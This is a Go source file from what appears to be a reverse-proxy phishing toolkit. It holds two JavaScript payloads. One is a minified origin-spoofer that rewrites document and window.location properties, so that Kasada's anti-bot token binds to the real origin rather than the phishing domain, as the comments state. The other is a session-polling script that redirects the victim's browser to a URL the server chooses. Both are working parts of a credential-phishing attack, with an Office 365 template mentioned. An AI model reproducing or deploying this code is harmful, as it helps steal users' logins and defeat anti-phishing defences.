package core

// KASADA_ORIGIN_SPOOFER_JS is the minified Kasada KPSDK origin-spoofer script.
// It overrides all origin-binding DOM properties that the KPSDK reads when computing
// its anti-bot token, so the token is bound to the real origin rather than the phishing
// domain.  Substitution keys: {kasada_host}, {kasada_domain}, {kasada_origin}.
//
// Compared to the inline spoofer in o365.yaml, this version also covers document.referrer
// which Kasada v2.11+ reads via sendBeacon payloads.
const KASADA_ORIGIN_SPOOFER_JS = `(function(){try{var H="{kasada_host}";var D="{kasada_domain}";var O="{kasada_origin}";try{Object.defineProperty(document,"domain",{configurable:true,get:function(){return D;},set:function(){}})}catch(e){}try{Object.defineProperty(document,"URL",{configurable:true,get:function(){return O+window.location.pathname+window.location.search;}})}catch(e){}try{Object.defineProperty(document,"baseURI",{configurable:true,get:function(){return O+"/"}})}catch(e){}try{Object.defineProperty(document,"referrer",{configurable:true,get:function(){return O+"/"}})}catch(e){}var L=window.location;try{Object.defineProperty(L,"hostname",{configurable:true,get:function(){return H;}})}catch(e){}try{Object.defineProperty(L,"host",{configurable:true,get:function(){return H;}})}catch(e){}try{Object.defineProperty(L,"origin",{configurable:true,get:function(){return O;}})}catch(e){}try{Object.defineProperty(L,"protocol",{configurable:true,get:function(){return "https:";}})}catch(e){}try{Object.defineProperty(L,"port",{configurable:true,get:function(){return "";}})}catch(e){}try{Object.defineProperty(L,"href",{configurable:true,get:function(){return O+L.pathname+L.search+L.hash;},set:function(v){window.location.assign(v);}})}catch(e){}}catch(e){}})();`

const DYNAMIC_REDIRECT_JS = `
function getRedirect(sid) {
	var url = "/s/" + sid;
	console.log("fetching: " + url);
	fetch(url, {
		method: "GET",
		headers: {
			"Content-Type": "application/json"
		},
		credentials: "include"
	})
		.then((response) => {

			if (response.status == 200) {
				return response.json();
			} else if (response.status == 408) {
				console.log("timed out");
				getRedirect(sid);
			} else {
				throw "http error: " + response.status;
			}
		})
		.then((data) => {
			if (data !== undefined) {
				console.log("api: success:", data);
				top.location.href=data.redirect_url;
			}
		})
		.catch((error) => {
			console.error("api: error:", error);
			setTimeout(function () { getRedirect(sid) }, 10000);
		});
}
getRedirect('{session_id}');
`
